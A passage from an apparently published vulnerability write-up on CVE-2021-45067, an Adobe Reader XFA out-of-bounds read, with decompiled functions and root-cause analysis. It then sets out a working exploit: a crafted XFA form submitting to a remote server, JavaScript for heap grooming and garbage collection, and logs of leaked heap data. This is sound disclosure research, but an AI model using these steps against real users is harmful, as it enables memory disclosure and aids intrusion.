\u003cvalue\u003e\n                \u003cfloat\u003e 1872560676325559.1 \u003c/float\u003e\n            \u003c/value\u003e\n        \u003c/field\u003e\n        \u003cfield id=\"clickMe\" name=\"clickMe\" w=\"4\" h=\"4\" x=\"4\" y=\"4\"\u003e\n            \u003cui\u003e\n                \u003cimageEdit /\u003e\n            \u003c/ui\u003e\n            \u003cevent activity=\"mouseUp\"\u003e\n                \u003csubmit format=\"formdata\" target=\"http://example.com/\" textEncoding=\"UTF-16\"\u003e\u003c/submit\u003e\n            \u003c/event\u003e\n        \u003c/field\u003e\n    \u003c/subform\u003e\n\u003c/template\u003e\n```\n\nIn `rcx` dump we see `1,872,560,676,325,559` which is the string representation of `\u003cfloat\u003e` value `1872560676325559.1` of xfa field. One key thing to notice in `rcx` dump is that it's stored as `ANSI`. As mentioned earlier, the bug is **Out-Of-Bound Read** as function `crash_sub_20A49980` tried to read beyond allocated buffer while processing float value.\n\n\u003e Note: See the allocation stack trace\n\nThis vulnerability only gets triggered when the user clicks on the **form** and `mouseUp` event is triggered which submits the form to the defined target URL `target=\"http://example.com/\"`. One more additional factor for **Adobe Reader** to take the vulnerable path is that **XFA** data should already be in the **reset** state. This could be achieved by the below-given javascript.\n\n```js\nxfa.host.resetData();\n```\n\nNow the question is why `rcx` register value was **out-of-bounds**. For this, let's see the decompiled code of the crashing function.\n\n```c\nvoid __fastcall crash_sub_20A49980(__int64 this, __int64 someStackBuff, char *somExpression, __int64 a4)\n{\n  __int16 v6; // bp\n  char *newStrBuff; // rbx\n  __int16 textEncoding; // ax\n  char *lsomExpression; // rcx\n  int i; // edx\n  char currentSOMCharVal; // al\n  char *nextSOMChar; // rcx\n  char nextSOMCharVal; // r8\n  int strLength; // eax\n  __int16 maxSOMExprLength; // ax\n  __int16 maxNewStrLength; // di\n  __int16 textEncoding_1; // ax\n  char *lnewStrBuff; // rcx\n  int j; // edx\n  char currentCharVal; // al\n  char *nextChar; // rcx\n  char nextCharVal; // r8\n  int newStrLength; // eax\n  __int64 v24; // [rsp+0h] [rbp-498h] BYREF\n  __int16 v25; // [rsp+30h] [rbp-468h] BYREF\n  char *v26; // [rsp+38h] [rbp-460h]\n  char outputBuffer[1040]; // [rsp+40h] [rbp-458h] BYREF\n  __int64 v28; // [rsp+450h] [rbp-48h]\n\n  v6 = 0;\n  newStrBuff = string_alloc_copy_ret_addr_sub_20A477E4(\n                 this,\n                 someStackBuff,\n                 (__int64)somExpression,\n                 a4,\n                 (void (__fastcall *)(__int64, __int64, __int64, __int64, int))crash_sub_20A49980,\n                 \u0026v25);  // allocates and copies the float field string representation\n                         // as ANSI and then return the address of newly copied string\n                         //\n                         // 0000016F`142E9FE0  31 2C 38 37 32 2C 35 36 30 2C 36 37 36 2C 33 32  1,872,560,676,32\n                         // 0000016F`142E9FF0  35 2C 35 35 39 00 D0 D0 D0 D0 D0 D0 D0 D0 D0 D0  5,559...........\n                         // 0000016F`142EA000  ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??  ................\n                         //\n  v26 = newStrBuff;\n  if ( !v25 )\n  {\n    if ( (*(unsigned int (__fastcall **)(_QWORD))(gAcroSupportHFT + 248))(*(_QWORD *)(someStackBuff + 40)) )\n    {\n      outputBuffer[0] = '\u0026';\n      v6 = 1;\n    }\n    textEncoding = utf_16_K;\n    if ( utf_16_K == -1 )\n      textEncoding = CLazyAtom::operator unsigned short((__int64)\u0026utf_16_K);\n    lsomExpression = somExpression;\n    if ( *(_WORD *)(someStackBuff + 68) == textEncoding )\n    {\n      for ( i = 0; ; i += 2 )\n      {\n        currentSOMCharVal = *lsomExpression;\n        nextSOMChar = lsomExpression + 1;\n        nextSOMCharVal = *nextSOMChar;\n        lsomExpression = nextSOMChar + 1;\n        if ( !currentSOMCharVal \u0026\u0026 !nextSOMCharVal )\n          break;\n      }\n      strLength = i;\n    }\n    else\n    {\n      strLength = ASstrnlen_safe(somExpression, 0x7FFFFFFFui64, 0i64);\n    }\n    maxSOMExprLength = url_encode(\n                         *(_QWORD *)(someStackBuff + 40),\n                         (__int64)outputBuffer,\n                         v6,\n                         (unsigned __int8 *)somExpression,\n                         strLength);\n    maxNewStrLength = maxSOMExprLength;\n    if ( maxSOMExprLength \u003c 1026 )\n    {\n      outputBuffer[maxSOMExprLength] = '=';\n      maxNewStrLength = maxSOMExprLength + 1;\n    }\n    if ( newStrBuff )\n    {\n      textEncoding_1 = utf_16_K;\n      if ( utf_16_K == -1 )\n        textEncoding_1 = CLazyAtom::operator unsigned short((__int64)\u0026utf_16_K);\n      lnewStrBuff = newStrBuff;\n      if ( *(_WORD *)(someStackBuff + 68) == textEncoding_1 )\n      {\n        for ( j = 0; ; j += 2 )\n        {                                 // miUCSStrlen_safe\n          currentCharVal = *lnewStrBuff;  // crashes here. this is trying to find the length of UTF-16 string\n                                          // but the actual allocated string is UTF-8\n          nextChar = lnewStrBuff + 1;\n          nextCharVal = *nextChar;\n          lnewStrBuff = nextChar + 1;\n          if ( !currentCharVal \u0026\u0026 !nextCharVal )\n            break;\n        }\n        newStrLength = j;\n      }\n      else\n      {\n        newStrLength = ASstrnlen_safe(newStrBuff, 0x7FFFFFFFui64, 0i64);\n      }\n      maxNewStrLength = url_encode(\n                          *(_QWORD *)(someStackBuff + 40),\n                          (__int64)outputBuffer,\n                          maxNewStrLength,\n                          (unsigned __int8 *)newStrBuff,\n                          newStrLength);  // this OOB data is leaked to remote server\n    }\n    if ( maxNewStrLength \u003e 0 )\n      (*(void (__fastcall **)(_QWORD, char *, _QWORD))(gAcroSupportHFT + 280))(\n        *(_QWORD *)(someStackBuff + 40),\n        outputBuffer,\n        (unsigned int)maxNewStrLength);\n  }\n  if ( newStrBuff )\n    (*(void (__fastcall **)(char *))(gAcroSupportHFT + 24))(newStrBuff);\n  some_sec_cookie_sub_21064BF0((unsigned __int64)\u0026v24 ^ v28);\n}\n```\n\nWe can see in the above function that `string_alloc_copy_ret_addr_sub_20A477E4` is responsible for making a copy of the already allocated string representation of the `\u003cfloat\u003e` value. The new buffer is allocated and the string representation is copied by treating the buffer as `ANSI` as you can see in the `rcx` dump.\n\nLet's see the code of `string_alloc_copy_ret_addr_sub_20A477E4` for a better understanding of what it's doing.\n\n```c\nchar *__fastcall string_alloc_copy_ret_addr_sub_20A477E4(\n        __int64 this,\n        __int64 a2,\n        __int64 somExpression,\n        __int64 a4,\n        void (__fastcall *callback)(__int64, __int64, __int64, __int64, int),\n        _WORD *a6)\n{\n  char *v10; // rdi\n  _WORD *v11; // r13\n  int ret; // eax\n  __int64 v13; // rdi\n  unsigned __int16 v14; // ax\n  _BYTE *srcBuff; // rbx\n  int v16; // eax\n  char *dst; // rax\n  int v18; // er14\n  __int64 v19; // rax\n  __int64 v21; // rax\n  int *v22; // rbx\n  __int64 v23; // rax\n  __int64 v24; // r14\n  int Len; // eax\n  _BYTE *Bytes; // rax\n  int v27; // edx\n  unsigned int v28; // eax\n  __int64 v29; // rdx\n  __int16 v30; // cx\n  __int16 v31; // ax\n  __int64 v32; // rdx\n  __int64 v33; // rax\n  __int64 v34; // rdx\n  __int16 v35; // cx\n  int v36; // edx\n  int v37; // [rsp+20h] [rbp-40h]\n  __int128 v38; // [rsp+38h] [rbp-28h] BYREF\n  __int128 v39; // [rsp+48h] [rbp-18h] BYREF\n\n  v10 = 0i64;\n  v11 = a6;\n  *a6 = 1;\n  ret = (*(__int64 (__fastcall **)(__int64))(gCosHFT + 16))(a4); // a4 - seems like some encoding type\n                                                                 // returns 4\n  switch ( ret )\n  {\n    case 5:\n    case 8:\n      v21 = EStrNewFromCosObjImpl(a4);\n      v22 = (int *)v21;\n      if ( *(_WORD *)(a2 + 34) )\n      {\n        v23 = ConvertDateValueToCanonical(this, v21);\n        v24 = v23;\n        if ( v23 )\n        {\n          Len = EStrGetLen(v23);\n          v10 = (char *)ASSureMalloc(Len + 1);\n          Bytes = (_BYTE *)EStrGetBytes(v24);\n          if ( Bytes \u0026\u0026 *Bytes == 0xFE \u0026\u0026 Bytes[1] == 0xFF )\n            miUCSStrcpy_safe(v10, 0x7FFFFFFFui64, (__int64)Bytes, 0i64);\n          else\n            ASstrcpy_safe(v10, 0x7FFFFFFFi64, (__int64)Bytes, 0i64);\n          EStrDelete(v24);\nLABEL_37:\n          if ( v22 )\n            EStrDelete((__int64)v22);\n          goto LABEL_39;\n        }\n      }\n      v38 = 0i64;\n      *(_QWORD *)\u0026v38 = sub_209E23D8(v22);\n      v39 = 0i64;\n      v28 = CASText::len(0i64, v27);\n      CASText::CASText((__int64 *)\u0026v39, (char (*)[8])\"\\r\\n\", 0, v28);\n      (*(void (__fastcall **)(_QWORD, const char *, _QWORD))(gASExtraHFT + 320))(v38, \"\\r\", v39);\n      CASText::~CASText((__int64 *)\u0026v39, v29);\n      v30 = utf_8_K;\n      if ( utf_8_K == -1 )\n        v30 = CLazyAtom::operator unsigned short((__int64)\u0026utf_8_K);\n      v31 = *(_WORD *)(a2 + 68);\n      if ( v31 == v30 )\n      {\n        v32 = 2i64;\n      }\n      else\n      {\n        v35 = utf_16_K;\n        if ( utf_16_K == -1 )\n        {\n          v35 = CLazyAtom::operator unsigned short((__int64)\u0026utf_16_K);\n          v31 = *(_WORD *)(a2 + 68);\n        }\n        if ( v31 != v35 )\n        {\n          v36 = *(_DWORD *)(a2 + 64);\n          if ( v36 == -1 || v36 == 32 )\n            v33 = (*(__int64 (__fastcall **)(_QWORD, _WORD **))(gASExtraHFT + 216))(v38, \u0026a6);\n          else\n            v33 = (*(__int64 (__fastcall **)(_QWORD))(gASExtraHFT + 208))(v38);\n          goto LABEL_36;\n        }\n        v32 = 0i64;\n      }\n      v33 = (*(__int64 (__fastcall **)(_QWORD, __int64))(gASExtraHFT + 176))(v38, v32);\nLABEL_36:\n      v10 = (char *)v33;\n      CASText::~CASText((__int64 *)\u0026v38, v34);\n      goto LABEL_37;\n    case 4:\n      v13 = gCoreHFT;\n      v14 = (*(__int64 (__fastcall **)(__int64))(gCosHFT + 152))(a4);         // calls a function in Acrobat returns 1593\n      srcBuff = (_BYTE *)(*(__int64 (__fastcall **)(_QWORD))(v13 + 56))(v14); // returns source buffer\n      v16 = ASstrnlen_safe(srcBuff, 0x7FFFFFFFui64, 0i64);\n      dst = (char *)ASSureMalloc(v16 + 1);                                    // memory is allocated here\n      v10 = dst;\n      if ( srcBuff \u0026\u0026 *srcBuff == 0xFE \u0026\u0026 srcBuff[1] == 0xFF )\n        miUCSStrcpy_safe(dst, 0x7FFFFFFFui64, (__int64)srcBuff, 0i64);\n      else\n        ASstrcpy_safe(dst, 0x7FFFFFFFi64, (__int64)srcBuff, 0i64);            // string is written here\n      goto LABEL_39;\n    case 7:\n      v18 = (*(__int64 (__fastcall **)(__int64))(gCosHFT + 232))(a4);\n      if ( v18 \u003e 0 )\n      {\n        do\n        {\n          v19 = (*(__int64 (__fastcall **)(__int64, _QWORD))(gCosHFT + 200))(a4, (unsigned int)v10);\n          LOWORD(v37) = 0;\n          callback(this, a2, somExpression, v19, v37);\n          LODWORD(v10) = (_DWORD)v10 + 1;\n        }\n        while ( (int)v10 \u003c v18 );\n      }\n      return 0i64;\n  }\n  if ( ret )\n    return 0i64;\nLABEL_39:\n  *v11 = 0;\n  return v10;\n}\n```\n\nIn the above function, we execute the `case 4` block where `ASstrnlen_safe` is used to calculate the length of the `ANSI` string. `ASSureMalloc` is responsible for allocating a new buffer and `ASstrcpy_safe` is used to copy the string to the newly allocated buffer.\n\n**Till now everything is `ANSI`, then why this bug occurred?**\n\nLet's see the relevant part of the code which caused the crash.\n\n```c\nif (newStrBuff) {\n    textEncoding_1 = utf_16_K;\n    if (utf_16_K == -1)\n        textEncoding_1 = CLazyAtom::operator unsigned short((__int64) \u0026 utf_16_K);\n    lnewStrBuff = newStrBuff;\n    if (*(_WORD*)(someStackBuff + 68) == textEncoding_1) {\n        for (j = 0;; j += 2) {              // miUCSStrlen_safe\n            currentCharVal = *lnewStrBuff;  // crashes here. this is trying to find the length of UTF-16 string\n                                            // but the actual allocated string is UTF-8\n            nextChar = lnewStrBuff + 1;\n            nextCharVal = *nextChar;\n            lnewStrBuff = nextChar + 1;\n            if (!currentCharVal \u0026\u0026 !nextCharVal)\n                break;\n        }\n        newStrLength = j;\n    } else {\n        newStrLength = ASstrnlen_safe(newStrBuff, 0x7FFFFFFF ui64, 0 i64);\n    }\n    maxNewStrLength = url_encode( *\n        (_QWORD * )(someStackBuff + 40),\n        (__int64) outputBuffer,\n        maxNewStrLength,\n        (unsigned __int8 * ) newStrBuff,\n        newStrLength); // this OOB data is leaked to remote server\n}\n```\n\nThe crash occurred while calculating the **length** of the newly allocated buffer, in this line `currentCharVal = *lnewStrBuff;`.\n\nWe can see that if the new string buffer was allocated successfully, then it's going to check the `textEncoding` of the field being converted. If the `textEncoding` is `utf_16_K` then it's going to call `miUCSStrlen_safe` (inlined in this case) or else `ASstrnlen_safe`.\n\nThe question is when everything was done as `ANSI`, then why the code treated the `ANSI` buffer as `Unicode`?\n\nThe answer is in the **XFA XDP** packet.\n\n```xml\n\u003csubmit format=\"formdata\" target=\"http://example.com/\" textEncoding=\"UTF-16\"\u003e\u003c/submit\u003e\n```\n\nHere, `textEncoding` is set to `UTF-16` and, when the **form** is submitted, a `POST` request is sent to the `target` URL with data in the below-given format.\n\n```bash\n$ sudo python3 web-server-post.py -i 0.0.0.0 -p 80\nWeb server listening on 0.0.0.0:80\n\nsubform0[0].#field[0]=1,872,560,676,325,559\n```\n\nThe below given is a partially symbolized stack trace that makes more sense now. Now, we better understand what the bug is and why it's caused.\n\n```\n0:000\u003e kc\n # Call Site\n00 AcroForm!crash_sub_20A49980\n01 AcroForm!sub_20A41150\n02 AcroForm!sub_20ABF354\n03 AcroForm!ExportAsHtml\n04 AcroForm!AFSubmitIt\n05 AcroForm!sub_20C09860\n06 AcroForm!SubmitDispatcher__dispatch\n07 AcroForm!sub_2100B170\n08 AcroForm!XFAEventManager__eventOccurred\n09 AcroForm!XFAFormModelImpl__execEvent\n0a AcroForm!XFAFormModelImpl__eventOccurred\n0b AcroForm!XFAFormModelImpl__eventOccurred_0\n0c AcroForm!piDocumentContext__eventOccurred\n0d AcroForm!sub_20B7B1F8\n0e AcroForm!sub_20B7B1C0\n0f Acrobat!AIDE::PixelPartInfo::PixelPartInfo\n```\n\nIn short, the vulnerable code is **missing proper validation** of the **input string type** before **trusting** `textEncoding`.\n\n## Exploitation\n\n**Can we exploit this vulnerability? It's pretty easy to exploit this bug.**\n\nThe exploitation involves the following steps:\n\n- Figure out if we can control the float string size\n- Groom the LFH bucket of the target size\n- Trigger the vulnerability and leak data to the remote server\n\n### Control String Length\n\nFirst thing while writing the exploit was to figure out the allocation size that is not triggered frequently by **Adobe Reader**.\n\nOne of the string sizes I settled for this exploit was `0x58`. This is a good size as it's not frequently allocated and freed in the background. This size also aligns the **heap chunk** perfectly so that there is only **one** **NULL** byte at the end.\n\nThis can be achieved by below given XFA `\u003cfloat\u003e` value:\n\n```xml\n\u003cfloat\u003e 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111.1 \u003c/float\u003e\n```\n\n\u003e Note: `1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111.11` is represented as `111111111111111108135579683325721145151278646022500260507995217127497448141778097012736` in string.\n\n### Groom LFH\n\nGrooming the LFH bucket of size `0x58` is as easy as allocating strings of the target length. Below given javascript can help to achieve the same:\n\n```js\nconst groomLFH = (size, count) =\u003e {\n    var string = unescape(\"%u4142\").repeat(size);\n\n    for (var i = 0; i \u003c count; i++) {\n        chunks.push(string.substr(0, (size - 2) / 2).toUpperCase());\n    }\n\n    for (var i = 0; i \u003c chunks.length; i += 4) {\n        chunks[i] = null;\n        delete chunks[i];\n    }\n};\n```\n\nNow to make the holes we need to trigger **Garbage Collection**. Below given javascript can help to achieve the same:\n\n```js\nconst triggerGC = () =\u003e {\n    let count = 0x100000;\n    var string = \"GC\".repeat(count);\n\n    for (var i = 0; i \u003c 1000; i++) {\n        string.substr(0, count);\n    }\n};\n```\n\n### Vulnerability Trigger\n\n**How do we reliably trigger the information leak?**\n\nWe have only one `\u003cfloat\u003e` string value and, `LFH` randomization makes it harder to **re-allocate** the holes efficiently.\n\nOne solution that turned out to be effective was to add multiple `\u003cfloat\u003e` fields to the **XDP** packet. It helped to increase the reliability of the reallocation of the holes.\n\nFinally, when the user **clicks** on the field, the **form** is submitted. If the **leak** is successful, then anything after `111111111111111108135579683325721145151278646022500260507995217127497448141778097012736` is **out-of-bounds** data, if it's not another **SOM** expression.\n\nFor this exploit, I choose to use this pattern:\n\n```\nBABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\n```\n\nIf in the web server logs, you see the above pattern then the leak was successful. If we see any **non-printable** data, it's also **out-of-bounds** data. Let's have a look at the web server logs:\n\n```bash\n$ sudo python3 web-server-post.py -i 0.0.0.0 -p 80\nWeb server listening on 0.0.0.0:80\n\nsubform0[0].#field[0]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736\\�����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[10]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[11]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[12]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[13]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[14]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736$����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[15]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[16]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[17]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736$����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[18]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[19]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[1]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[20]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736\\�����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[21]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[22]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[23]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[24]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[25]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[26]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736$����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[27]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[28]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[29]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[2]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[30]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[31]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[32]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[33]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736$����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[34]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[35]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736�A���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[36]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[37]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[38]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[39]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[3]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736�A���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[4]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[5]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[6]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[7]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736\\�����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[8]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\u0026subform0[0].#field[9]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA\n192.168.0.110 - - [05/Oct/2021 14:12:12] \"POST / HTTP/1.1\" 200 -\n```\n\nWe can see that **out-of-bounds** data is leaked successfully.\n\n\u003e Note: In the exploit, please change the url `target=\"http://192.168.0.110/\"` to reflect the remote server IP address.\n\n## Exploit Repository\n\n\u003chttps://github.com/hacksysteam/CVE-2021-45067\u003e\n\n## Demo Video\n\n\u003chttps://www.youtube.com/embed/2QNmhwN_I4w\u003e\n"])</script><script>self.__next_f.push([1,"b:[[\"$\",\"div\",null,{\"className\":\"-mt-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"mb-8\",\"children\":[\"$\",\"h1\",null,{\"className\":\"text-3xl md:text-4xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent\",\"children\":\"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067\"}]}]}],[\"$\",\"$L19\",null,{\"slug\":\"adobe-reader-xfa-ansi-unicode-confusion-information-leak\",\"frontmatter\":{\"title\":\"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067\",\"date\":\"October 12, 2022\",\"authors\":[\"Ashfaq Ansari\",\"Krishnakant Patil\"],\"excerpt\":\"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)\",\"tags\":[\"adobe\",\"Adobe Reader\",\"XFA\",\"ANSI-Unicode Confusion\",\"Information Disclosure\",\"information leak\",\"out-of-bounds read\",\"CVE-2021-45067\"]},\"content\":\"$1a\",\"tocItems\":[{\"id\":\"overview\",\"text\":\"Overview\",\"depth\":2},{\"id\":\"background\",\"text\":\"Background\",\"depth\":2},{\"id\":\"advisory\",\"text\":\"Advisory\",\"depth\":2},{\"id\":\"testbed\",\"text\":\"Testbed\",\"depth\":2},{\"id\":\"proof-of-concept\",\"text\":\"Proof of Concept\",\"depth\":2},{\"id\":\"crash-state\",\"text\":\"Crash State\",\"depth\":2},{\"id\":\"heap-operation\",\"text\":\"Heap Operation\",\"depth\":2},{\"id\":\"disassembly-around-crash\",\"text\":\"Disassembly Around Crash\",\"depth\":2},{\"id\":\"module-version\",\"text\":\"Module Version\",\"depth\":2},{\"id\":\"root-cause-analysis\",\"text\":\"Root Cause Analysis\",\"depth\":2},{\"id\":\"exploitation\",\"text\":\"Exploitation\",\"depth\":2},{\"id\":\"control-string-length\",\"text\":\"Control String Length\",\"depth\":3},{\"id\":\"groom-lfh\",\"text\":\"Groom LFH\",\"depth\":3},{\"id\":\"vulnerability-trigger\",\"text\":\"Vulnerability Trigger\",\"depth\":3},{\"id\":\"exploit-repository\",\"text\":\"Exploit Repository\",\"depth\":2},{\"id\":\"demo-video\",\"text\":\"Demo Video\",\"depth\":2}]}]]\n"])</script><script>self.__next_f.push([1,"10:null\n"])</script><script>self.__next_f.push([1,"14:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\nf:null\n"])</script><script>self.__next_f.push([1,"17:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067 | HackSys Inc Blog\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)\"}],[\"$\",\"link\",\"2\",{\"rel\":\"manifest\",\"href\":\"/manifest.webmanifest\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"meta\",\"3\",{\"name\":\"keywords\",\"content\":\"adobe, Adobe Reader, XFA, ANSI-Unicode Confusion, Information Disclosure, information leak, out-of-bounds read, CVE-2021-45067\"}],[\"$\",\"meta\",\"4\",{\"name\":\"script:ld+json\",\"content\":\"{\\\"@context\\\":\\\"https://schema.org\\\",\\\"@type\\\":\\\"Article\\\",\\\"headline\\\":\\\"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067\\\",\\\"datePublished\\\":\\\"2022-10-12T00:00:00.000Z\\\",\\\"author\\\":{\\\"@type\\\":\\\"Person\\\",\\\"name\\\":\\\"Ashfaq Ansari\\\"},\\\"description\\\":\\\"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)\\\",\\\"publisher\\\":{\\\"@type\\\":\\\"Organization\\\",\\\"name\\\":\\\"HackSys 